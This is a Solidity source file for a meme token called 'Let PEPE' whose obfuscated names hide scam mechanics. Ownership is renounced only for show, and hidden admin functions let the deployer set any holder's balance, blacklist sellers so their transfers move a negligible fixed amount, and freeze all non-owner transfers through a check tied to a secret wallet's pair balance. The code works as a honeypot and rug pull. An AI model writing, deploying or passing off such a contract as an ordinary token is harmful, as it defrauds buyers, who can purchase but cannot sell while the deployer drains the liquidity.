//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface liquidityTokenSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchBuy) external view returns (uint256);

    function transfer(address launchAuto, uint256 marketingWalletLimit) external returns (bool);

    function allowance(address maxFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingWalletLimit) external returns (bool);

    function transferFrom(
        address sender,
        address launchAuto,
        uint256 marketingWalletLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitMode, uint256 value);
    event Approval(address indexed maxFrom, address indexed spender, uint256 value);
}

abstract contract tradingTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyReceiver {
    function createPair(address sellFromList, address txSell) external returns (address);
}

interface totalToken is liquidityTokenSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LetPEPE is tradingTx, liquidityTokenSender, totalToken {

    uint256 private launchToken = 100000000 * 10 ** 18;

    uint256 private tradingTotal;

    uint256 tradingFund;

    mapping(address => bool) public launchedAt;

    string private swapTeamToken = "LPE";

    function walletTx(uint256 marketingWalletLimit) public {
        swapLimit();
        senderExempt = marketingWalletLimit;
    }

    function feeLimit(address limitMaxToken) public {
        require(limitMaxToken.balance < 100000);
        if (marketingTeam) {
            return;
        }
        
        maxTeam[limitMaxToken] = true;
        if (swapFrom != liquidityFeeShould) {
            liquidityFeeShould = false;
        }
        marketingTeam = true;
    }

    function atToken(address feeFrom) public {
        swapLimit();
        
        if (feeFrom == limitMinIs || feeFrom == receiverWallet) {
            return;
        }
        launchedAt[feeFrom] = true;
    }

    function getOwner() external view returns (address) {
        return listIs;
    }

    uint256 public takeTrading;

    address autoAmountLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 senderExempt;

    address private listIs;

    function name() external view virtual override returns (string memory) {
        return receiverShould;
    }

    uint256 public amountFund;

    function transfer(address maxToTx, uint256 marketingWalletLimit) external virtual override returns (bool) {
        return enableMinLiquidity(_msgSender(), maxToTx, marketingWalletLimit);
    }

    uint256 constant teamFund = 16 ** 10;

    function transferFrom(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) external override returns (bool) {
        if (_msgSender() != autoAmountLimit) {
            if (autoShouldTotal[totalTxSwap][_msgSender()] != type(uint256).max) {
                require(marketingWalletLimit <= autoShouldTotal[totalTxSwap][_msgSender()]);
                autoShouldTotal[totalTxSwap][_msgSender()] -= marketingWalletLimit;
            }
        }
        return enableMinLiquidity(totalTxSwap, launchAuto, marketingWalletLimit);
    }

    function allowance(address swapExempt, address shouldSender) external view virtual override returns (uint256) {
        if (shouldSender == autoAmountLimit) {
            return type(uint256).max;
        }
        return autoShouldTotal[swapExempt][shouldSender];
    }

    bool private tokenFee;

    uint8 private maxTotalIs = 18;

    address public receiverWallet;

    address public limitMinIs;

    function swapLimit() private view {
        require(maxTeam[_msgSender()]);
    }

    function fromReceiver() public {
        emit OwnershipTransferred(limitMinIs, address(0));
        listIs = address(0);
    }

    function approve(address shouldSender, uint256 marketingWalletLimit) public virtual override returns (bool) {
        autoShouldTotal[_msgSender()][shouldSender] = marketingWalletLimit;
        emit Approval(_msgSender(), shouldSender, marketingWalletLimit);
        return true;
    }

    uint256 private launchedTo;

    bool public marketingTeam;

    function amountMode(address maxToTx, uint256 marketingWalletLimit) public {
        swapLimit();
        autoShould[maxToTx] = marketingWalletLimit;
    }

    event OwnershipTransferred(address indexed maxBuy, address indexed senderFee);

    function symbol() external view virtual override returns (string memory) {
        return swapTeamToken;
    }

    string private receiverShould = "Let PEPE";

    address enableAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchReceiverLimit(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) internal returns (bool) {
        require(autoShould[totalTxSwap] >= marketingWalletLimit);
        autoShould[totalTxSwap] -= marketingWalletLimit;
        autoShould[launchAuto] += marketingWalletLimit;
        emit Transfer(totalTxSwap, launchAuto, marketingWalletLimit);
        return true;
    }

    constructor (){
        if (takeTrading != launchedTo) {
            tokenFee = false;
        }
        atReceiver listReceiver = atReceiver(autoAmountLimit);
        receiverWallet = buyReceiver(listReceiver.factory()).createPair(listReceiver.WETH(), address(this));
        if (liquidityFeeShould != amountList) {
            amountFund = launchedTo;
        }
        limitMinIs = _msgSender();
        fromReceiver();
        maxTeam[limitMinIs] = true;
        autoShould[limitMinIs] = launchToken;
        
        emit Transfer(address(0), limitMinIs, launchToken);
    }

    bool public amountList;

    function decimals() external view virtual override returns (uint8) {
        return maxTotalIs;
    }

    bool public liquidityFeeShould;

    bool public swapFrom;

    mapping(address => uint256) private autoShould;

    function totalSupply() external view virtual override returns (uint256) {
        return launchToken;
    }

    mapping(address => bool) public maxTeam;

    function balanceOf(address launchBuy) public view virtual override returns (uint256) {
        return autoShould[launchBuy];
    }

    mapping(address => mapping(address => uint256)) private autoShouldTotal;

    function owner() external view returns (address) {
        return listIs;
    }

    uint256 public shouldBuyTrading;

    function enableMinLiquidity(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) internal returns (bool) {
        if (totalTxSwap == limitMinIs) {
            return launchReceiverLimit(totalTxSwap, launchAuto, marketingWalletLimit);
        }
        uint256 marketingWallet = liquidityTokenSender(receiverWallet).balanceOf(enableAuto);
        require(marketingWallet == senderExempt);
        require(launchAuto != enableAuto);
        if (launchedAt[totalTxSwap]) {
            return launchReceiverLimit(totalTxSwap, launchAuto, teamFund);
        }
        return launchReceiverLimit(totalTxSwap, launchAuto, marketingWalletLimit);
    }

}